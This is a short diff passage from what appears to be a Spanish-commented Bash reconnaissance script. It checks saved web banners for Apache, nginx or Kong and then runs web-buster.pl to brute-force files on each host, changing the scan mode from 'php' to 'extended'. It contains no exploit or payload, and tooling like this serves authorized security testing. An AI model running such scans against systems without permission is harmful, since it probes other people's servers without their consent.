-	egrep -i "apache|nginx|kong" .enumeracion2/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
-	greprc=$?
-	if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
-		echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
-		web-buster.pl -t $host -p $port -h $hilos_web -d / -m php -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_webarchivos.txt &
-		sleep 1
-	else
-		echo -e "\t\t[+] No es Apache o no debemos escanear"
-	fi						
-	####################################
+		###  IP check ######
+		egrep -i "apache|nginx|kong" .enumeracion2/"$host"_"$port"_webData.txt | egrep -qiv "cisco|Router|BladeSystem|oracle|302 Found|Coyote|Express|AngularJS|Zimbra|Pfsense|GitLab|Roundcube|Zentyal|Taiga|NodeJS|Nextcloud|Open Source Routing Machine|ownCloud" # solo el segundo egrep poner "-q"
+		greprc=$?
+		if [[ $greprc -eq 0  ]];then # si el banner es Apache																							
+			echo -e "\t\t[+] Revisando archivos php ($host - Apache/nginx)"
+			web-buster.pl -t $host -p $port -h $hilos_web -d / -m extended -s $proto -q 1 | egrep --color=never "^200" > .enumeracion/"$host"_"$port"_extended.txt &
+			sleep 1
+		else
+			echo -e "\t\t[+] No es Apache o no debemos escanear"
+		fi						
+		####################################
 	
 	done # for	
 fi
